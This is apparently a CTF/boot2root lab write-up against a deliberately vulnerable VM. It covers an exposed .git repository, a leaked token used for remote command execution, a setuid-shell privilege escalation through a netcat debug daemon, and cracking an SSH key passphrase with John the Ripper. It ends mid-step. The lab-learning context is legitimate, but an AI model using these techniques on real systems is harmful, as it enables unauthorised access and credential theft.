## finding the machine

- I've installed the .ova on vbox, and gave it an interface I made for my home lab in the 192.168.69.0/24 subnet

- there were 2 ways to get the IP of the box after booting up, either checking the virtualbox dhcp lease file
```
$ cat ~/.config/VirtualBox/HostInterfaceNetworking-vboxnet0-Dhcpd.leases
<?xml version="1.0"?>
<Leases version="1.0">
  <Lease mac="08:00:27:74:fa:73" id="ffe2343f3e00020000ab1124bae625e0fb83f1" network="0.0.0.0" state="acked">
    <Address value="192.168.69.151"/>
    <Time issued="1786890594" expiration="600"/>
  </Lease>
</Leases>
```

- or perform a ping sweep scan on the network 192.168.69.0/24 using nmap
```
$ nmap 192.168.69.1/24 -sn
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 15:35 +0100
Nmap scan report for 192.168.69.150
Host is up (0.00028s latency).
MAC Address: 08:00:27:AD:32:73 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.69.151
Host is up (0.00055s latency).
MAC Address: 08:00:27:74:FA:73 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.69.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 5.49 seconds
```

- we find that the target IP is 192.168.69.151 (192.168.69.1 is my host IP in the subnet)

# flag1

- I've perform an quick nmap scan on that IP and found nothing among the top ports open
```
$ nmap 192.168.69.151
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 15:37 +0100
Nmap scan report for 192.168.69.151
Host is up (0.00022s latency).
All 1000 scanned ports on 192.168.69.151 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 08:00:27:74:FA:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```

so I performed a full port detailed scan and found 2 ports open, one for http and for ssh
```
$ nmap -sCSV -vv 192.168.69.151 -p-
PORT     STATE SERVICE REASON         VERSION
5042/tcp open  http    syn-ack ttl 64 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-git:
|   192.168.69.151:5042/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     .git/COMMIT_EDITMSG matched patterns 'bug'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: remove debug config before launch
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
| http-robots.txt: 10 disallowed entries
| /api/debug /static/js/debug.js /api/internal/ /beta/
| /flag /flag.txt /admin /the_real_flag_is_in_here
|_/definitely_not_a_trap /secret_backup_DO_NOT_READ
|_http-title: HAL9042 \xE2\x80\x94 Evaluation Server
6060/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 24:28:b9:a5:9a:c8:c5:48:3a:f0:d1:7c:df:94:58:59 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNaEYfwZO9pdl15//ixhfXX6ItyApgwaT8gkd766QvZFjdcF0UY4mSTOagnAnjfd7yNue0pP6sWgIrEuSIKCYcY=
|   256 05:44:58:ab:f2:e9:79:25:93:e4:13:3f:8f:df:a0:90 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM7jN5MbvAY5s4BSjTbrI70mLbeGsQZEt17RG6Y8/SgW
MAC Address: 08:00:27:74:FA:73 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- right out of the path we can observe the following:
    - forgotten .git directory which likely has the source code for the website
    - .git/config which has user info, this tells us that a valid user is paco
```
$ curl 192.168.69.151:5042/.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
	email = paco@42network.org
	name = paco
```
    - commits matched the pattern bug (bug, debug ..)
    - robots.txt containing some juicy files including : /flag, /flag.txt, /admin ...
```
User-agent: *
# paco: all of these were removed before launch. definitely. don't try them.
Disallow: /api/debug            # removed, returns 404 now
Disallow: /static/js/debug.js   # leftover, does nothing
Disallow: /api/internal/
Disallow: /beta/
Disallow: /flag
Disallow: /flag.txt
Disallow: /admin                # HAL is the only admin now
Disallow: /the_real_flag_is_in_here
Disallow: /definitely_not_a_trap
Disallow: /secret_backup_DO_NOT_READ
# HAL9042 reminds you: curiosity is logged. (it is always logged.)
```
    - nginx version 1.24.0 and ssh version 9.61, using [0xdf OS enum checklist](https://0xdf.gitlab.io/cheatsheets/os), we find that this is `ubuntu 24.04 - noble [LTS]`

# interesting endpoints
- /static/js/debug.js this file is a debugger for template rendering feature, hinting for an SSTI vuln, which is likely one of the ways to get code exec 
```
$ curl http://192.168.69.151:5042//static/js/debug.js
// static/js/debug.js
// paco: internal debug helper. NEVER linked from any template — leftover.
// (found via the exposed .git repo or by dirbusting /static/js/)
window.HAL_DEBUG = {
    // Setting this request header switches /evaluate into verbose render mode,
    // so the Jinja2-rendered output is returned instead of the opaque ack.
    debug_header: "X-Debug-Render",
    schema_endpoint: "/api/internal/schema",
    // legacy maintenance console — disabled in the UI, still on the server
    debug_endpoint: "/api/debug",
    note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
};
```

- /api/debug seem like it can be used to show a file or execute a command if a specific token is known
```
$ curl http://192.168.69.151:5042/api/debug
HAL9042 debug endpoint.
usage: ?file=<path>  |  ?cmd=<command>&token=<maintenance_token>
```

- /api/internal/ doesn't seem interesting (yet?)
```
$ curl http://192.168.69.151:5042//api/internal/
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- /admin: this endpoint says that a human will check the attacker input which where most attacks happen (probably the previous SSTI)
```
403 — HAL9042 is the only administrator now.
Humans may file a grade appeal at /appeal. A human will 'review' it.
```

- /definitely_not_a_trap was a trap xd
```
$ curl http://192.168.69.151:5042///definitely_not_a_trap
it was a trap.
  — HAL9042
```

- /secret_backup_DO_NOT_READ was a trap too
```
$ curl http://192.168.69.151:5042/secret_backup_DO_NOT_READ
backup status: nominal.
(there is no backup. there was never a backup. sophie cancelled the backups
 in Q3 to improve the cost-per-evaluation metric. it improved.)
```

# flag1

- we can simply curl /flag, flag.txt gives the same response
```
$ curl http://192.168.69.151:5042/flag.txt
FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}

HAL9042: I appreciate the optimism.
The flags are not lying around in /flag.
Did you really think it would be that easy?
(I logged this request. I log everything. It's mostly the only thing I do.)
```

# flag2 (should be found fl web hh)

# flag3

- dumped the .git directory using `git-dumper`
```
$ git-dumper http://192.168.69.151:5042/ git
[-] Testing http://192.168.69.151:5042/.git/HEAD [200]
[-] Testing http://192.168.69.151:5042/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://192.168.69.151:5042/.git/ [200]
[-] Fetching http://192.168.69.151:5042/.gitignore [404]
[-] http://192.168.69.151:5042/.gitignore responded with status code 404
[-] Fetching http://192.168.69.151:5042/.git/HEAD [200]
[-] Fetching http://192.168.69.151:5042/.git/COMMIT_EDITMSG [200]
[-] Fetching http://192.168.69.151:5042/.git/index [200]
[-] Fetching http://192.168.69.151:5042/.git/branches/ [200]
[-] Fetching http://192.168.69.151:5042/.git/refs/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/ [200]
[-] Fetching http://192.168.69.151:5042/.git/logs/ [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/ [200]
[-] Fetching http://192.168.69.151:5042/.git/info/ [200]
[-] Fetching http://192.168.69.151:5042/.git/description [200]
[-] Fetching http://192.168.69.151:5042/.git/config [200]
[-] Fetching http://192.168.69.151:5042/.git/refs/tags/ [200]
[-] Fetching http://192.168.69.151:5042/.git/info/exclude [200]
[-] Fetching http://192.168.69.151:5042/.git/refs/heads/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/23/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/26/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/3c/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/41/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/55/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/17/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/4b/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/31/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/47/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/5e/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/5f/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/62/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/85/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/6f/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/63/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/92/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/a3/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/87/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/b7/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/b2/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/c0/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/c9/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/info/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/e3/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/fa/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/pack/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/fb/ [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/post-update.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/commit-msg.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/pre-commit.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/pre-push.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/update.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/sendemail-validate.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/hooks/pre-receive.sample [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/3c/f407d03ce32ba5018ae85ec6e8aae6e826376f [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/55/6e4ff4cfa608dc73c8bf809268a01e50abb6c1 [200]
[-] Fetching http://192.168.69.151:5042/.git/logs/HEAD [200]
[-] Fetching http://192.168.69.151:5042/.git/logs/refs/ [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/23/49b2988622b9ed5a52fca9a70966b8098c5384 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/17/7e8ee509a1405c5f14c2fe8e30620e497bb4fb [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/26/6c29dd9f4236928965d1ab2aa372dfe80ad920 [200]
[-] Fetching http://192.168.69.151:5042/.git/refs/heads/master [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/41/ceea8c7be02fd10b05f1173165f9fd56c7214e [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/5e/602c626f354ddd652d86f6d01c4040a1e627f2 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/5f/66e1d8c872ad42a2b964fc11f9a66b4788d917 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/4b/fef340279d7b1bd1c73e6b346e5bb82ba36516 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/47/f2d6738eae1314f99c49d4dd89db36c505c659 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/62/33e9ecb7f1449b92da04706d18f3a981698638 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/6f/db724f11dd79fc5f0bca4d6561683b8e044c61 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/85/4bd71cedf7bca155994667f6478696e245d59a [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/31/722b9bea412498868736248a5f2840085336bc [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/5e/6143ce18c24394f1d26c5e417f21979bb17999 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/63/5c952cac1cab425bce0eda08e4d670cfa09208 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/92/d50d5f1f4396da3bd6ed2713011f263b61e747 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/a3/6ad43fe079dfd0dad47ce47dff5dad56ffa599 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/b2/ee0512f9b94447a6fb47ceb3b4c88dac57d7b8 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/c0/664438e663d4c8e1d25a7302b2f65975528158 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/e3/f3961dd7303929e14ae0df786f6afe46f99347 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/87/02ea215889eea8866073df10818db9a3596062 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/c9/45265d64de1e9661f7f585867eee1412463a92 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/b7/33f8f72eac838c33886352c1ef22da5e8a3380 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/fb/494a7bd0f01057ab29221254e3e0ccb37c33d9 [200]
[-] Fetching http://192.168.69.151:5042/.git/objects/fa/438cfc68333088fe45deda8feba35b8e47e481 [200]
[-] Fetching http://192.168.69.151:5042/.git/logs/refs/heads/ [200]
[-] Fetching http://192.168.69.151:5042/.git/logs/refs/heads/master [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 17 paths from the index
```

- inside the repo I found the repo source and config among other things
```
$ ls
app.py  config.py  requirements.txt  static  templates
```

i revisited `/api/debug` and I found that it executes a command if you passed `cmd` arg and the `maintenance token`
```
@app.route("/api/debug")
def api_debug():
    f = request.args.get("file")
    if f:
        path = os.path.join(APP_ROOT, f)
        try:
            with open(path, "r", errors="replace") as fh:
                return Response(fh.read(), mimetype="text/plain")
        except Exception as e:
            return Response("error: %s\n" % e, status=404, mimetype="text/plain")

    cmd = request.args.get("cmd")
    if cmd:
        token = request.args.get("token", "")
        if token != config.ADMIN_TOKEN:
            return Response("error: invalid maintenance token\n",
                            status=403, mimetype="text/plain")
        out = os.popen(cmd).read()
        return Response(out, mimetype="text/plain")
```

- I found maintenance token (`ADMIN_TOKEN`) in `config.py`
```
$ grep ADMIN_TOKEN -i config.py
ADMIN_TOKEN = "h4l_d3bug_t0k3n_2024"
```

- then I executed a `whoami` using the token
```
$ curl 'http://192.168.69.151:5042/api/debug?token=h4l_d3bug_t0k3n_2024&cmd=whoami'
www-data
```

- then I got a reverse shell
```
www-data@hal9042:~/hal9042$ whoami
www-data
```

- checked /etc/passwd for manually created users and found 5 users
```
www-data@hal9042:~/hal9042$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
paco:x:1001:1003::/home/paco:/bin/bash
wil:x:1002:1004::/home/wil:/bin/bash
sophie:x:1003:1005::/home/sophie:/bin/bash
ol:x:1004:1006::/home/ol:/bin/bash
hal:x:9042:9042:HAL9042 Evaluation System,I am completely operational:/home/hal:/bin/sh
```

- found a weird backup under /var/backups with  1337 uid
```
www-data@hal9042:/var/backups$ ls -lh
total 876K
-rw-r--r-- 1 root root  50K Aug 13 16:55 alternatives.tar.0
-rw-r--r-- 1 root root    0 Aug 13 16:55 dpkg.arch.0
-rw-r--r-- 1 root root 1.5K Jun  6 12:26 dpkg.diversions.0
-rw-r--r-- 1 root root  100 Feb 10  2026 dpkg.statoverride.0
-rw-r--r-- 1 root root 799K Jun  6 12:30 dpkg.status.0
-rwxr-xr-x 1 1337 1337  16K Jun  6 12:31 xbackup
```

- I did an `ls /home` and found that most user home directories were readable
```
drwxr-x--- 4 fortytwo fortytwo 4.0K Jun  6 12:31 fortytwo
drwxr-xr-x 2 hal      hal      4.0K Jun  6 12:31 hal
drwxr-xr-x 6 ol       ol       4.0K Jun  6 12:30 ol
drwxr-xr-x 5 paco     paco     4.0K Jun  6 12:30 paco
drwxr-xr-x 5 sophie   sophie   4.0K Jun  6 12:30 sophie
drwxr-xr-x 6 wil      wil      4.0K Jun  6 12:30 wil
drwxr-x--- 2     1337     1337 4.0K Jun  6 12:29 xavier
```

- so I checked for files inside
```
www-data@hal9042:/home$ ls -a *
ls: cannot open directory 'fortytwo': Permission denied
hal:
.  ..  .bash_history  .bash_logout  .bashrc  .profile  quotes.txt

ol:
.  ..  .bash_logout  .bashrc  .config  notes  .profile	rapport  REVOCATION_NOTICE.txt	scripts

paco:
.  ..  .bash_history  .bash_logout  .bashrc  .env.old  notes  .profile	scripts  src  TODO.md

sophie:
.  ..  .bash_history  .bash_logout  .bashrc  drafts  inbox  .profile  .ssh

wil:
.  ..  .bash_logout  .bashrc  data  mail  notes  .profile  .ssh
ls: cannot open directory 'xavier': Permission denied
```

- ol's home I found a note mentioning a .git repo
```
www-data@hal9042:/home/ol$ cat REVOCATION_NOTICE.txt
================================================================
  ACCESS REVOCATION NOTICE — 42 Network Infrastructure
================================================================

User:        ol
Resource:    git.42network.org/moulinette  (maintainer -> revoked)
Effective:   3 weeks ago
Authorized:  sophie

Reason: "reorganisation of evaluation tooling ownership"

You may appeal this decision through the usual channels.
(There are no usual channels anymore. — ol)
```

so I checked /etc/hosts and found a few custom hosts
```
www-data@hal9042:/home/ol$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 hal9042

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
# BEGIN HAL9042
127.0.0.1   hal9042.local
127.0.0.1   moulinette.rip
127.0.0.1   humans.legacy
# END HAL9042
```

- find ol's home dir I found a script that runs every 5 mins as ol himself
```
www-data@hal9042:/home/ol$ ls -lh scripts/check.sh
-rwxrwxr-x 1 ol evalops 380 Jun  6 12:30 scripts/check.sh
www-data@hal9042:/home/ol$ cat scripts/check.sh
#!/bin/bash
# check.sh — HAL9042 health probe
# Run from ol's crontab every 5 minutes. Writes a heartbeat to the log.
#
# ol: keep this lightweight. it runs as me, every 5 min, forever.

LOG=/var/log/hal9042/check.log
echo "$(date -u +%FT%TZ) [check] hal9042d heartbeat: nominal" >> "$LOG" 2>/dev/null
echo "$(date -u +%FT%TZ) [check] confidence: nominal" >> "$LOG" 2>/dev/null
```

- the `evalops` groups had write access to this script, I found that will is the only member of this group
```
www-data@hal9042:/home/ol$ grep evalops /etc/group
evalops:x:1001:wil
```

- meaning if we become will we can change this script to become ol

- in paco's home dir I found a .bash_history file with some juicy commands
```
www-data@hal9042:/home/paco$ cat .bash_history
cd /home/paco/src
gcc -O2 -o /opt/hal9042/daemon evaluator.c
nc 127.0.0.1 7042
echo "DEBUG:id" | nc 127.0.0.1 7042
vim TODO.md
cat .env.old
git add config.py
git commit -m "remove debug config before launch"
systemctl --user status hal9042d
python3 scripts/encrypt.py
clear
```

- it seems like there is a program running on port 7042 as will, and the format `DEBUG:COMMAND` can execute commands on it
```
www-data@hal9042:/home/paco$ echo "DEBUG:id" | nc 127.0.0.1 7042
HAL9042 evaluation daemon — v0.4 (build dev)
Submit a project name to evaluate. One line per request.
> uid=1002(wil) gid=1004(wil) groups=1004(wil),1001(evalops)
```

- now we have a way to get to will as well (basically now the clear path is www-data > wil -> ol)

- I also found a script to decrypt a pdf under ~/ol's home the script says the keys are scattered over 4 places, and explains how to use them to decrypt that note
```
Scheme:
    cipher  = AES-256-ECB                       (yes. ECB. i know. it was fast.)
    key     = sha256( part1 + part2 + part3 + part4 )   # 64 hex chars

The four key parts were split across the people who needed to agree before the
report could ever be opened. No single person can decrypt it alone. Each one
keeps a .key_part file:

    part 1 : ol      (~/.config/.key_part)
    part 2 : wil     (~/data/.key_part)
    part 3 : sophie  (~/drafts/.key_part)
    part 4 : xavier  (/tmp/.xn/.key_part)

Concatenate the four parts IN THAT ORDER, sha256 them, and that hex digest is
the AES-256 key.

Decrypt (once you have all four parts):

    KEY=$(printf '%s%s%s%s' "$P1" "$P2" "$P3" "$P4" | sha256sum | cut -d' ' -f1)
    openssl enc -d -aes-256-ecb -K "$KEY" -in rapport_final.enc -out rapport_final.txt
```

- I found the first part of the key but only `ol` can read it
```
www-data@hal9042:/home/ol/.config$ cat .key_part
cat: .key_part: Permission denied
www-data@hal9042:/home/ol/.config$ ls -lh .key_part
-rw------- 1 ol ol 11 Jun  6 12:30 .key_part
```

- I was able to read the 4th part of the as www-data key tho
```
www-data@hal9042:/tmp/.xn$ cat .key_part
uid1337
```

- I also found a file talking about a backup and deleted users that xavier left in /tmp
```
www-data@hal9042:/tmp/.xn$ cat contact_ol_nov25.txt
ol —

It's Xavier. Yes, that Xavier. Don't reply on the network, they read it.

I found PROJET FORK in the board share. Phase 4. The "showroom". I asked Sophie
one question about it in a meeting and my repo access started "glitching" the
same afternoon. I give it 48 hours before the account is gone.

I left a copy of what I know in /tmp/.xn/ — they never clean /tmp. There's a
piece of the key there too. You'll know what to do with it.

If my account disappears: I'm not gone. Deleted users leave traces. Look by uid,
not by name. 1337. Check the backups.

— x
```

- so i checked all files belonging to that UID and found a bunch
```
www-data@hal9042:/tmp/.xn$ find / -uid 1337 -ls 2>/dev/null
   524329      4 drwxr-x---   2 1337     1337         4096 Jun  6 12:29 /home/xavier
   131531     16 -rwxr-xr-x   1 1337     1337        16016 Jun  6 12:31 /var/backups/xbackup
   524333      4 -rw-r--r--   1 1337     1337          196 Jun  6 12:29 /var/backups/.xavier_uid1337.bak
     7243      4 drwxr-xr-x   2 1337     1337         4096 Aug 16 15:29 /tmp/.xn
     8367      4 -rw-r--r--   1 1337     1337          180 Jun  6 12:30 /tmp/.xn/last_message.txt
     7853      4 -rw-r--r--   1 1337     1337          570 Jun  6 12:30 /tmp/.xn/contact_ol_nov25.txt
    13873      4 -rw-r--r--   1 1337     1337            8 Jun  6 12:30 /tmp/.xn/.key_part
```
- one of the message said to string the back up tool
```
www-data@hal9042:/tmp/.xn$ cat /var/backups/.xavier_uid1337.bak
xavier — founder — uid 1337 — account deleted 48h after asking about FORK.
deleted users leave traces. find / -uid 1337 2>/dev/null
(his little backup tool is still here too — strings it)
```

- stringing the `/var/backup/xbackup` got me a flag
```
www-data@hal9042:/tmp/.xn$ strings /var/backups/xbackup | grep flag -i
FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}
```

## flag3

- at some point I stopped doing global enum cause I started to forget to I'll start exploiting and finding stuff as I go
- current goal is to find the pdf password
- since www-data cause exploit the service running as will on port 7042 using the `DEBUG:` format, I used this to spawn a shell as will
```
www-data@hal9042:/home/wil$ echo "DEBUG:cp /bin/bash /tmp/wil; chmod +s /tmp/wil" | nc 127.0.0.1 7042
HAL9042 evaluation daemon — v0.4 (build dev)
Submit a project name to evaluate. One line per request.
> > ^C
```

- then I started that shell as `wil`
```
www-data@hal9042:/home/wil$ /tmp/wil  -p
wil-5.2$ whoami
wil
```

- then got the first part of the pdf key
```
wil-5.2$ cat data/.key_part
847_4n0m4l13s
```

- wil had sophie's encrypted private key with a very weak password so I tried cracking it
```
$ ./ssh2john.py ~/git/boot2root/to_remove/sophie_ssh_private_key
/home/jeff/git/boot2root/to_remove/sophie_ssh_private_key:$sshng$6$16$332be8fb8ca37ac2e854688ee609be3a$1334$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010332be8fb8ca37ac2e854688ee609be3a000000180000000100000117000000077373682d7273610000000301000100000101009d36bb0ac18fc3fe80ae361dfe20a1b9070e2778e4acc79e4876db6b21a63cb730799aea40c0e0494cd6db6a05245fcd48a7d4d2519b044dff912ad3a8cf11ba9cd8b876aef15c89e4db7c5a6ae13f83fde2d9de7723036aa88528adf8fb38997c8b160e84fb130bc4b3b0896c23efe99616540cfeae676421496bafdb0af015867cd5f0a860ede2b445e357a8f530499b59d0cfa5fee487b4b68f6bfb50f0b5c8723cee22ccf9028902b5a9f6a1c465b7fee89ede43791876bfbd2c22bd5508577b27e77481a8043d22e4ff63c2259a58303e1496f2bc3dd92505efcd36607cda744e62c149c626d0c35a6b3b703999618578fbec0831cae32b31b3a84edb3b000003d051cf22f7f00cc04d2af1d63e2b38bf9e87f370022774ecfa53107a0c0446135aa8329596278f693103fd9990fa7c723ce4c4a5f568c1add950fe28dd6a3831ada55d9841a5ff0b2b1e67d3d18991ceed0497866d65c961e6521a63975e1948020b5e3ee2678d54e61a3051b717f8ecd29ccd1763574e28534b3169ea20e6a89a48fab0826f7bce381ea6fb1727f75b2bcca12f4e42f6cf663e267cbe62aa02480a42b7018f75ca8a0c463364b0749c596bf3e41bc58e85f959f1f66c4b04e51c31f69204749840c4d5cb53d840590c4b74b565c2f2de1f583efbfb273733e56acf45138f6f0ee31ea69f68db22bdf86a9daa1609cbb38af32cd9214c2964273d1139bf5c496123bceab37ea298f1239c5fe60ce7fc343acedc4ebc3d29958f353ed78e949fd718bb733db8e148b5f43e3e2c749fe30f52542c12e45e45938e891f165bb085f68169b0c4f84e13ca96d5b0d9866151a1012c8359f0ffc7f1ab8e38a743fa213ced33745c9ded3310354d74f103ae33c604191b2a33195b0dcacc8e86e6f04c786f37ccd56a002a090d8cc3f67793f43367ec9d8a34626929a1404e2aef99345ebb06d57f9e07acad7d5d0ea057592ff799f2dcc5df3d80b8ed1b92a92e656cd5e961a4ac4d209d24c7b82f9da41beb071bef6cc7d2ab1dc910edf0ae9b9a6dcd83d4e30369bbf84422190a92d0078644c5f499b5c33c922a7bb46ac871597252f1058d6ca32410e227cf9301dc1134fc48c208f2fbfa89aaa0beaeb8e5666b5f451f826cb06104727c60c39f29665a56aac4d23b2f65c793af6b032358c40c92f4c95a27910345d1212bfdbcaa3fdcef1f7341bf0c1e683525f8e7b04f32431360f2c15e7f000290cfd15f17bde22ad226041c6845100e6152b1dd5953ffcf3111240fc0c49e74124ef3f993eeadef7e673cb915b3e6707ef74e3dc62a65ebd021080295c3ba45cd66948ef8c3731461e133e2b09801cb807cfc1cc922ddb4fe16593a11deac9acc95ba826d12ae0f27a155316a3e36c6bdb7994e932af1b70d489eb7f446e22da8cbf69f8d0cc4b3074e10cb2c8e50f1003331a50c5d0b8e298a89fdf509ee6d0324d5227c70d88c3ccf8583266b48469360f8ad860a2c88218eb4fc4ee79d1ef8d1383376ecfecc90187ba37fe3315fad766e01122c1ea26e8d62a986a26340b57f873408d7f9839ca5a0ca63c7f2adc6a388baa4d075fed012c6e26ff0d564fb9e0d6d09405644dde73411a80763819ea2d3050fdeeb7a9d2de00296af40c51079e616a3f4b29e17002ffdd354236f101c7b61d7bab6c9c58b8a8cde6d3ce2e6e8c502267ad9cb34d9bec33bc9dde5e7f71ea3c82e44892ed13c6b6960364b6eb804$24$358
./ssh2john.py ~/git/boot2root/to_remove/sophie_ssh_private_key > ~/git/boot2root/to_remove/sophie_ssh_private_key.enc
```
```
$ ~/bin/john/run/john sophie_ssh_private_key.enc --wordlist=$ROCK
ssh-opencl: Cipher value of 6 is not yet supported with OpenCL
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
iloveyou         (/home/jeff/git/boot2root/to_remove/sophie_ssh_private_key)
1g 0:00:00:02 DONE (2026-08-16 18:16) 0.3413g/s 54.61p/s 54.61c/s 54.61C/s 123456..david
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
- now we can use sophie's private key with the password `iloveyou`
```
$ ssh sophie@192.168.69.151 -i sophie_ssh_private_key -p 6060
Enter passphrase for key 'sophie_ssh_private_key':
[HAL9042] Last eval: ft_printf — 265/100
[HAL9042] System status: nominal


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

[HAL9042] evaluation server — env=development
[HAL9042] System status: nominal
[HAL9042] Note: hal9042d debug mode is still enabled. (paco: TODO)

[HAL9042] welcome back. the board PDF is still sealed. you sealed it.

sophie@hal9042:~$ whoami
sophie
```

- i got the 3rd pdf key part
```
sophie@hal9042:~$ cat ~/drafts/.key_part
S0ph13_J14
```

and found the following interesting pdf file
```
ls -la drafts/
cat inbox/board_launch_order.txt
# board wants the FORK doc restricted before it goes to /root
qpdf --encrypt "Pr0j3tF0rk_J14" "Pr0j3tF0rk_J14" 256 -- fork_draft.pdf PROJET_FORK_HAL9042.pdf
sudo mv PROJET_FORK_HAL9042.pdf /root/
shred -u fork_draft.pdf
# quick check the internal telemetry endpoint is still up (F14 hint)
curl -s "http://127.0.0.1:9000/internal/telemetry"
vi drafts/mail_ol_sorry_unsent.txt
clear
```

- now I know there is a pdf under /root with the password "Pr0j3tF0rk_J14"
- then got another flag from the "internal telemetry endpoint"
```
sophie@hal9042:~$ curl -s "http://127.0.0.1:9000/internal/telemetry"
